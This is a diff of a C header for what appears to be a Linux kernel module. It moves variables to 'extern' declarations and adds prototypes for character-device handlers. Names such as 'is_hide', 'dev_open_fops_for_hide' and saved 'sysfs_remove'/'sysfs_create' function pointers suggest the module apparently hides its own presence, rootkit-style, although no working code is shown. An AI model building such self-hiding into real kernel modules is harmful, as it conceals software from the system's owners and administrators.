@@ -21,19 +21,27 @@ static struct dentry* file;
 static struct dentry* subdir;
 static char msg_Ptr[BUFF_SIZE];
 static size_t buf_pos;
-
-void (*sysfs_remove_fir_orig)(struct kobject*);
-void (*sysfs_create_fir_orig)(struct kobject*);
-int is_hide = 0;
-int ret;
-struct cdev* mcdev;
-int major_number;
-dev_t dev_num;
-
 struct fake_device
 {
     char data[100];
     struct semaphore sem;
 
 };
+extern struct fake_device virtual_device, virtual_device1;
+
+extern void (*sysfs_remove_fir_orig)(struct kobject*);
+extern void (*sysfs_create_fir_orig)(struct kobject*);
+int dev_open_fops_for_hide(struct inode *inode, struct file* file);
+int device_open(struct inode *inode, struct file * filp);
+ssize_t device_write(struct file *flip, const char * buff_sorce_data, size_t buff_count, loff_t * offset);
+int device_close(struct inode *inode, struct file *flip);
+static ssize_t device_read(struct file *filp, char __user * buffer, size_t length, loff_t *offset);
+
+int is_hide = 0;
+extern int ret;
+extern struct cdev* mcdev;
+extern int major_number;
+extern dev_t dev_num;
+
+
 #endif
